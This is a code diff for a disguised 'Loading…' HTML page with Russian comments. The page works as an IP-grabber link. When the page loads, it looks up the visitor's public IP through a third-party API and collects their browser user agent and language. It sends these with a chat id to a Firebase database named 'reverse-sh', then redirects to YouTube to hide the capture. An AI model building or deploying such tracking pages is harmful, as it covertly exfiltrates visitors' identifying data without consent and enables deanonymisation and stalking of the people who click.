@@ -1,24 +1,34 @@
 <!doctype html>
 <html><head><meta charset="utf-8"><title>Loading…</title></head><body>
 <script>
-  // 1. Параметры из URL
+  // 1. Кто мы
   const p = new URLSearchParams(location.search);
   const chatId = p.get('c');
-  const ip = p.get('ip');          // ← реальный IP из GitHub-перенаправления
   const ua = navigator.userAgent;
   const lang = navigator.language;
   const now = new Date().toLocaleString("ru-RU");
 
-  // 2. Пишем в RTDB через REST (без SDK)
-  fetch(
-    `https://reverse-sh-default-rtdb.europe-west1.firebasedatabase.app/users/${chatId}/hits.json`,
-    {
-      method: "POST",
-      body: JSON.stringify({ ip: ip, ua: ua, lang: lang, time: now })
-    }
-  );
-
-  // 3. Уходим на легитимный сайт
-  location.replace("https://youtube.com");
+  // 2. Узнаём IP через сторонний API (бесплатно)
+  fetch("https://api.ipify.org?format=json")
+    .then(r => r.json())
+    .then(data => {
+      const ip = data.ip;
+      // 3. Пишем в RTDB
+      fetch(
+        `https://reverse-sh-default-rtdb.europe-west1.firebasedatabase.app/users/${chatId}/hits.json`,
+        {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({ ip: ip, ua: ua, lang: lang, time: now })
+        }
+      );
+      // 4. Уходим
+      location.replace("https://youtube.com");
+    })
+    .catch(() => {
+      // если не получилось IP – всё равно уходим
+      location.replace("https://youtube.com");
+    });
 </script>
+
 </body></html>
